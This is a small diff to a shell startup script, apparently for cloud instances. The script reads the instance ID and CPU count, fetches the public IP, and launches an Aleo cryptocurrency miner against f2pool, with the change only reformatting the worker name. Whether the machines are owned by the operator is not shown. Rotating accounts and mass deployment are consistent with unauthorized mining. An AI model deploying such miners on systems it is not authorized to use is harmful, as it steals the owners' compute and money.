@@ -91,7 +91,8 @@ INSTANCE_ID=$(cat /var/lib/cloud/data/instance-id)
 account=$(random_choice "${strings[@]}")
 cpu=$(cat /proc/cpuinfo | grep processor | wc -l)
 my_ip=$(curl ifconfig.me)
+ipname=$(echo $my_ip | awk -F '.' '{print $3"."$4}')
 userid=${INSTANCE_ID//-/}
-/root/aleo.sh stratum+tcp://aleo-asia.f2pool.com:4400 $account.$my_ip.$cpu
+/root/aleo.sh stratum+tcp://aleo-asia.f2pool.com:4400 $account.$ipname$cpu
 
 #amb.code.end
